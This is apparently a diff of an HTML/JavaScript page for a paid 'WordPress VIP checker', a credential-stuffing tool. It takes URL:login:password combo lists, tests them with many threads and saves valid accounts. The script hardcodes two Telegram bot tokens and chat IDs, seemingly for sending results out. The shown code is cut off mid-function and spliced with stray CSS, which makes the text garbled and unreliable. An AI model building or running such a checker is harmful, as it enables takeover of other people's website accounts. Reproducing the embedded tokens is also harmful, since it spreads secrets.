@@ -5,25 +5,22 @@
     <title>NAXLRUN VIP CHECKER</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Source+Code+Pro:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'JetBrains Mono', 'Source Code Pro', monospace;
+            font-family: 'JetBrains Mono', monospace;
         }
         
         body {
-            background: linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.9)), 
-                        url('https://tmpfiles.org/dl/6346785/screenshot_2025-10-25-11-44-57-63_680d03679600f7af0b4c700c6b270fe7.jpg');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            color: #fff;
+            background: #000;
+            color: #0f0;
             min-height: 100vh;
             overflow-x: hidden;
             position: relative;
+            padding: 20px;
         }
         
         /* Snow Effect */
@@ -55,7 +52,6 @@
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
         }
         
         /* Blinking Text Effect */
@@ -66,24 +62,6 @@
         @keyframes blink {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.7; }
-        }
-        
-        .blink-fast {
-            animation: blink-fast 0.8s infinite;
-        }
-        
-        @keyframes blink-fast {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .blink-slow {
-            animation: blink-slow 2s infinite;
-        }
-        
-        @keyframes blink-slow {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
         }
         
         .wave-text {
@@ -100,11 +78,9 @@
         header {
             text-align: center;
             padding: 20px 0;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             border-bottom: 2px solid #ffcc00;
             box-shadow: 0 0 15px #ffcc00;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
         }
         
         .ascii-art {
@@ -116,45 +92,39 @@
             text-align: center;
             color: #ffcc00;
             text-shadow: 0 0 10px #ffcc00;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         
         h1 {
-            font-size: 2.5rem;
-            margin: 20px 0;
+            font-size: 2rem;
+            margin: 15px 0;
             text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px #ffcc00, 0 0 20px #ffcc00;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #ffcc00;
             color: #ffcc00;
         }
         
         /* Access Key Section */
         .access-section {
-            background: rgba(0, 20, 40, 0.9);
+            background: #111;
             border: 2px solid #ffcc00;
             border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 30px;
-            box-shadow: 0 0 15px #ffcc00;
+            padding: 15px;
+            margin-bottom: 20px;
             text-align: center;
         }
         
         .access-input {
-            width: 300px;
-            padding: 12px;
-            margin: 15px 0;
-            background: rgba(0, 40, 60, 0.9);
+            width: 100%;
+            max-width: 300px;
+            padding: 10px;
+            margin: 10px 0;
+            background: #000;
             border: 1px solid #ffcc00;
             border-radius: 5px;
             color: #fff;
             font-size: 1rem;
             text-align: center;
-            box-shadow: 0 0 10px #ffcc00;
-            font-family: 'JetBrains Mono', monospace;
-        }
-        
-        .access-input::placeholder {
-            color: #aaa;
         }
         
         /* Main Content */
@@ -163,28 +133,27 @@
         }
         
         .panel {
-            background: rgba(0, 20, 40, 0.9);
+            background: #111;
             border: 2px solid #ffcc00;
             border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 30px;
-            box-shadow: 0 0 15px #ffcc00;
+            padding: 15px;
+            margin-bottom: 15px;
         }
         
         .panel-title {
-            font-size: 1.5rem;
-            margin-bottom: 15px;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
             text-align: center;
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
             border-bottom: 1px solid #ffcc00;
-            padding-bottom: 10px;
+            padding-bottom: 8px;
             color: #ffcc00;
         }
         
         /* Input Section */
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
         
         label {
@@ -194,43 +163,39 @@
             color: #fff;
         }
         
-        input, select, textarea {
+        input, textarea {
             width: 100%;
-            padding: 10px;
-            background: rgba(0, 40, 60, 0.9);
+            padding: 8px;
+            background: #000;
             border: 1px solid #ffcc00;
             border-radius: 5px;
             color: #fff;
-            font-size: 1rem;
-            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
         }
         
         textarea {
-            height: 150px;
+            height: 120px;
             resize: vertical;
         }
         
         /* Buttons */
         .btn {
             display: inline-block;
-            padding: 12px 25px;
-            background: linear-gradient(45deg, #ff9900, #ffcc00);
+            padding: 10px 20px;
+            background: #ffcc00;
             border: none;
             border-radius: 5px;
             color: #000;
-            font-size: 1rem;
+            font-size: 0.9rem;
             font-weight: bold;
             text-transform: uppercase;
             cursor: pointer;
             transition: all 0.3s;
-            margin: 5px;
-            box-shadow: 0 0 10px #ffcc00;
-            font-family: 'JetBrains Mono', monospace;
+            margin: 3px;
         }
         
         .btn:hover {
-            background: linear-gradient(45deg, #ffcc00, #ff9900);
-            box-shadow: 0 0 15px #ffcc00;
+            background: #ffaa00;
             transform: translateY(-2px);
         }
         
@@ -239,79 +204,82 @@
         }
         
         .btn-danger {
-            background: linear-gradient(45deg, #ff3300, #ff6600);
+            background: #ff4444;
+            color: #fff;
         }
         
         .btn-danger:hover {
-            background: linear-gradient(45deg, #ff6600, #ff3300);
+            background: #ff0000;
         }
         
         .btn-success {
-            background: linear-gradient(45deg, #00cc66, #00ff99);
+            background: #00cc66;
+            color: #fff;
         }
         
         .btn-success:hover {
-            background: linear-gradient(45deg, #00ff99, #00cc66);
+            background: #00aa55;
         }
         
         .btn-secondary {
-            background: linear-gradient(45deg, #666, #999);
+            background: #666;
+            color: #fff;
         }
         
         .btn-secondary:hover {
-            background: linear-gradient(45deg, #999, #666);
+            background: #555;
         }
         
         /* Results Section */
         .results-container {
-            max-height: 400px;
+            max-height: 300px;
             overflow-y: auto;
             border: 1px solid #ffcc00;
             border-radius: 5px;
             padding: 10px;
-            background: rgba(0, 10, 20, 0.9);
-            font-family: 'JetBrains Mono', monospace;
+            background: #000;
+            margin-top: 10px;
         }
         
         .result-item {
-            padding: 10px;
-            margin-bottom: 10px;
+            padding: 8px;
+            margin-bottom: 8px;
             border-radius: 5px;
             border-left: 4px solid #ffcc00;
-            background: rgba(0, 30, 60, 0.8);
+            background: #222;
             color: #fff;
-            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            word-break: break-all;
         }
         
         .valid {
             border-left-color: #ffcc00;
-            background: rgba(60, 45, 0, 0.8);
+            background: #332200;
             color: #ffcc00;
         }
         
         .invalid {
             border-left-color: #ff0000;
-            background: rgba(60, 0, 0, 0.8);
+            background: #330000;
             color: #ff0000;
+        }
+        
+        .info {
+            border-left-color: #00ccff;
+            background: #002233;
+            color: #00ccff;
         }
         
         /* Music Player */
         .music-player {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0, 20, 40, 0.9);
+            bottom: 10px;
+            right: 10px;
+            background: #111;
             border: 2px solid #ffcc00;
-            border-radius: 10px;
-            padding: 15px;
-            box-shadow: 0 0 15px #ffcc00;
+            border-radius: 5px;
+            padding: 10px;
             z-index: 100;
-        }
-        
-        .music-controls {
-            display: flex;
-            align-items: center;
-            gap: 10px;
         }
         
         /* Stats Section */
@@ -319,48 +287,47 @@
             display: flex;
             justify-content: space-around;
             flex-wrap: wrap;
-            margin: 20px 0;
+            margin: 15px 0;
         }
         
         .stat-item {
             text-align: center;
-            padding: 15px;
-            background: rgba(0, 30, 60, 0.8);
-            border-radius: 10px;
+            padding: 10px;
+            background: #222;
+            border-radius: 5px;
             border: 1px solid #ffcc00;
-            min-width: 150px;
-            margin: 10px;
+            min-width: 120px;
+            margin: 5px;
         }
         
         .stat-value {
-            font-size: 2rem;
+            font-size: 1.5rem;
             font-weight: bold;
-            margin: 10px 0;
+            margin: 5px 0;
             color: #ffcc00;
         }
         
         /* Footer */
         footer {
             text-align: center;
-            padding: 20px;
-            margin-top: 30px;
+            padding: 15px;
+            margin-top: 20px;
             border-top: 1px solid #ffcc00;
-            font-size: 0.9rem;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
+            font-size: 0.8rem;
         }
         
         /* Mode Selector */
         .mode-selector {
             display: flex;
             justify-content: center;
-            gap: 20px;
-            margin-bottom: 20px;
+            gap: 10px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
         }
         
         .mode-btn {
-            padding: 15px 30px;
-            font-size: 1.2rem;
+            padding: 12px 20px;
+            font-size: 0.9rem;
         }
         
         /* Hidden Elements */
@@ -368,8 +335,297 @@
             display: none;
         }
         
+        /* File Upload */
+        .file-input {
+            display: none;
+        }
+        
         /* Responsive Design */
         @media (max-width: 768px) {
+            .ascii-art {
+                font-size: 4px;
+            }
+            
+            h1 {
+                font-size: 1.5rem;
+            }
+            
+            .stats {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .music-player {
+                position: static;
+                margin-top: 15px;
+            }
+            
+            .mode-selector {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Snow Effect -->
+    <div class="snow" id="snow"></div>
+    
+    <div class="container">
+        <!-- Header with ASCII Art -->
+        <header>
+            <div class="ascii-art blink">
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢹⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⢀⣀⣴⣶⡏
+⢸⣿⣿⣿⣿⣷⣦⣄⡀⠀⣼⣿⡿⠁⠀⠀⠈⢿⣿⣧⡀⢀⣠⣴⣾⣿⣿⣿⣿⡇
+⠀⣿⣿⣿⣿⠟⠿⣿⣿⣿⣿⣿⣥⣤⣤⣤⣤⣬⣿⣿⣿⣿⣿⠿⠻⢿⣿⣿⣿⠀
+⠀⢸⣿⣿⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⣿⣿⡇⠀
+⠀⠈⣿⣿⡆⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢰⣿⣿⠁⠀
+⠀⠀⢻⣿⣷⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣾⣿⡟⠀⠀
+⠀⠀⠘⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠃⠀⠀
+⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+
+████████████████████████████████████████████████████████████████
+█▄─▀█▄─▄██▀▄─██▄─▀─▄█▄─▄███▄─▄▄▀█▄─██─▄█▄─▀█▄─▄█▄─█▀▀▀█─▄█▄─▄▄─█
+██─█▄▀─███─▀─███▀─▀███─██▀██─▄─▄██─██─███─█▄▀─███─█─█─█─███─▄▄▄█
+▀▄▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄█▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▀▀▄▄▄▀▄▄▄▀▀▄▄▄▀▀▀
+            </div>
+            <h1 class="wave-text">NAXWORDPRESS & DA/PA CHECKER</h1>
+            <p class="blink">Auto WordPress Account & Domain Authority Checker Tool</p>
+        </header>
+        
+        <!-- Access Key Section -->
+        <section class="access-section" id="accessSection">
+            <h2 class="blink">ENTER ACCESS KEY</h2>
+            <input type="password" class="access-input" id="accessKey" placeholder="Enter Access Key">
+            <br>
+            <button class="btn" onclick="checkAccessKey()">UNLOCK TOOL</button>
+            <p style="margin-top: 10px; font-size: 0.8rem;">BUY KEY LEK? DM TELEGRAM @NAXLRUNTOOLS</p>
+        </section>
+        
+        <!-- Main Content (Hidden until access granted) -->
+        <section class="main-content" id="mainContent">
+            <!-- Mode Selector -->
+            <div class="mode-selector">
+                <button class="btn mode-btn" id="wpModeBtn" onclick="switchMode('wp')">Checker Wordpress VIP</button>
+                <button class="btn mode-btn btn-secondary" id="dapaModeBtn" onclick="switchMode('dapa')">Auto DA PA : Domain Authority Page Authority Urls Check</button>
+            </div>
+            
+            <!-- WordPress Checker Panel -->
+            <div class="panel" id="wpPanel">
+                <h2 class="panel-title">WORDPRESS ACCOUNT CHECKER</h2>
+                <div class="input-group">
+                    <label for="comboData">WordPress Combos (URLs#Log@Pass / URLs:Log:Pass / URLs|Log|Pass)</label>
+                    <textarea id="comboData" placeholder="https://example.com#admin@password
+https://site.com:user:pass123
+https://demo.com|admin|admin123"></textarea>
+                </div>
+                <div class="input-group">
+                    <label for="threadCount">Threads (1-50)</label>
+                    <input type="number" id="threadCount" min="1" max="50" value="5">
+                </div>
+                <div>
+                    <button class="btn btn-success" onclick="startChecking()">START CHECKING</button>
+                    <button class="btn btn-danger" onclick="stopChecking()">STOP CHECKING</button>
+                    <button class="btn" onclick="clearResults()">CLEAR RESULTS</button>
+                    <button class="btn" onclick="saveValidResults()">SAVE VALID RESULTS</button>
+                    <button class="btn" onclick="uploadComboFile()">UPLOAD COMBO FILE</button>
+                    <input type="file" id="fileUpload" class="file-input" accept=".txt" onchange="handleFileUpload(this.files)">
+                </div>
+                <div class="results-container" id="resultsContainer">
+                    <div class="result-item info">
+                        Results will appear here...
+                    </div>
+                </div>
+            </div>
+            
+            <!-- DAPA Checker Panel -->
+            <div class="panel hidden" id="dapaPanel">
+                <h2 class="panel-title">DA/PA URL CHECKER</h2>
+                <div class="input-group">
+                    <label for="dapaUrls">URLs to Check (One per line)</label>
+                    <textarea id="dapaUrls" placeholder="https://example.com
+https://site.com
+https://demo.com"></textarea>
+                </div>
+                <div class="input-group">
+                    <label for="dapaThreads">Threads (1-50)</label>
+                    <input type="number" id="dapaThreads" min="1" max="50" value="3">
+                </div>
+                <div>
+                    <button class="btn btn-success" onclick="startDapaCheck()">START DA/PA CHECK</button>
+                    <button class="btn btn-danger" onclick="stopDapaCheck()">STOP DA/PA CHECK</button>
+                    <button class="btn" onclick="clearDapaResults()">CLEAR RESULTS</button>
+                </div>
+                <div class="results-container" id="dapaResultsContainer">
+                    <div class="result-item info">
+                        DA/PA results will appear here...
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Stats Panel -->
+            <div class="panel">
+                <h2 class="panel-title">STATISTICS</h2>
+                <div class="stats">
+                    <div class="stat-item">
+                        <div>Total Checked</div>
+                        <div class="stat-value" id="totalChecked">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Valid Accounts</div>
+                        <div class="stat-value" id="validAccounts">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Invalid Accounts</div>
+                        <div class="stat-value" id="invalidAccounts">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Success Rate</div>
+                        <div class="stat-value" id="successRate">0%</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Footer -->
+        <footer>
+            <p>NAXWORDPRESS & DA/PA CHECKER &copy; 2025 | Created by @NAXLRUNTOOLS</p>
+            <p>FOR EDUCATIONAL PURPOSES ONLY</p>
+        </footer>
+    </div>
+    
+    <!-- Music Player -->
+    <div class="music-player">
+        <button class="btn" id="playBtn" onclick="toggleMusic()">PLAY MUSIC</button>
+    </div>
+
+    <script>
+        // Access Keys
+        const VALID_ACCESS_KEYS = [
+            "NAXLRUN-VIP-2025", 
+            "NAXLRUN-TOOLS-VIP", 
+            "NAXLRUN-CHECKER-WORDPRESS"
+        ];
+        
+        // Telegram Configuration
+        const TELEGRAM_BOTS = [
+            {
+                token: "7100209772:AAF6Pms3R4HYmValX4WkYKDRXtz1WhL-Ov8",
+                chatId: "7028315947"
+            },
+            {
+                token: "8310663236:AAH7IWCGZytOtpPnonNdECAcsgizpd9KLZk", 
+                chatId: "7431149093"
+            }
+        ];
+        
+        // Global variables
+        let currentMode = 'wp';
+        let checking = false;
+        let dapaChecking = false;
+        let totalChecked = 0;
+        let validAccounts = 0;
+        let invalidAccounts = 0;
+        let validResults = [];
+        
+        // Snow Effect
+        function createSnow() {
+            const snowContainer = document.getElementById('snow');
+            const snowflakes = ['❄', '✦', '❅', '❆', '•'];
+            
+            for (let i = 0; i < 50; i++) {
+                const snowflake = document.createElement('div');
+                snowflake.className = 'snowflake';
+                snowflake.textContent = snowflakes[Math.floor(Math.random() * snowflakes.length)];
+                snowflake.style.left = Math.random() * 100 + 'vw';
+                snowflake.style.animationDuration = (Math.random() * 5 + 5) + 's';
+                snowflake.style.animationDelay = Math.random() * 5 + 's';
+                snowflake.style.fontSize = (Math.random() * 10 + 10) + 'px';
+                snowflake.style.opacity = Math.random() * 0.7 + 0.3;
+                snowContainer.appendChild(snowflake);
+            }
+        }
+        
+        // Check Access Key
+        function checkAccessKey() {
+            const inputKey = document.getElementById('accessKey').value.trim();
+            if (VALID_ACCESS_KEYS.includes(inputKey)) {
+                document.getElementById('accessSection').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                addResult('Access granted! Tool unlocked successfully.', 'info');
+            } else {
+                alert('Invalid Access Key!');
+            }
+        }
+        
+        // Switch between modes
+        function switchMode(mode) {
+            currentMode = mode;
+            
+            // Update button styles
+            document.getElementById('wpModeBtn').classList.toggle('btn-secondary', mode !== 'wp');
+            document.getElementById('dapaModeBtn').classList.toggle('btn-secondary', mode !== 'dapa');
+            
+            // Show/hide panels
+            document.getElementById('wpPanel').classList.toggle('hidden', mode !== 'wp');
+            document.getElementById('dapaPanel').classList.toggle('hidden', mode !== 'dapa');
+            
+            addResult(`Switched to ${mode === 'wp' ? 'WordPress Checker' : 'DA/PA Checker'} mode`, 'info');
+        }
+        
+        // Music Control
+        const audio = new Audio('https://tmpfiles.org/dl/6661091/gilaaaapecahhhhfrommedanhelvet.mp3');
+        audio.loop = true;
+        let isPlaying = false;
+        
+        function toggleMusic() {
+            const playBtn = document.getElementById('playBtn');
+            
+            if (isPlaying) {
+                audio.pause();
+                playBtn.textContent = 'PLAY MUSIC';
+                isPlaying = false;
+            } else {
+                // Try to play music
+                audio.play().then(() => {
+                    playBtn.textContent = 'STOP MUSIC';
+                    isPlaying = true;
+                }).catch(error => {
+                    console.log("Audio play failed:", error);
+                    alert("Please interact with the page first, then try playing music again.");
+                });
+            }
+        }
+        
+        // WordPress Checker Functions
+        function startChecking() {
+            const comboData = document.getElementById('comboData').value;
+            const threadCount = parseInt(document.getElementById('threadCount').value);
+            
+            if (!comboData.trim()) {
+                alert('Please enter WordPress combos!');
+                return;
+            }
+            
+            checking = true;
+            clearResults();
+            totalChecked = 0;
+            validAccounts = 0;
+            invalidAccounts = 0;
+            validResults = [];
+            updateStats();
+            
+            addResult('Starting WordPress account checking...', 'info');
+            
+            // Parse combos
+            const combos = parseCombos(comboData);
+            
+            // Start checking process
+           @media (max-width: 768px) {
             .ascii-art {
                 font-size: 4px;
             }
@@ -1143,6 +1399,7 @@ https://demo.com|admin|admin123"></textarea>
 </body>
 
 </html>
+
 
 
 
